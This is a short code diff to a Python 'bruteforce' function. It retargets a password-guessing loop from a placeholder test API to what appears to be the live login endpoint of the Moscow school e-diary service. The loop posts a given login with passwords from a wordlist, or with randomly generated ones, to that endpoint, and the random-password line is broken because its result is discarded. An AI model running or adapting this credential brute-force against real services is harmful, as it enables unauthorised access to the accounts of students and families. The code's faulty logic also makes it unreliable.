@@ -37,7 +37,7 @@ def bruteforce(mode, login):
         passwords = open(slovar, "r", encoding="utf-8").readlines()
         if passwords != "":
             for password in passwords:
-                res = requests.post("https://jsonplaceholder.typicode.com/posts", json={
+                res = requests.post("https://dnevnik.mos.ru/lms/api/sessions", json={
                     "login": login,
                     "password_plain": password
                 })
@@ -83,7 +83,7 @@ def bruteforce(mode, login):
             for i in range(7):
                 password + random.choice(instance)    
             
-            res = requests.post("https://jsonplaceholder.typicode.com/posts", json={
+            res = requests.post("https://dnevnik.mos.ru/lms/api/sessions", json={
                 "login": login,
                 "password_plain": password
             })
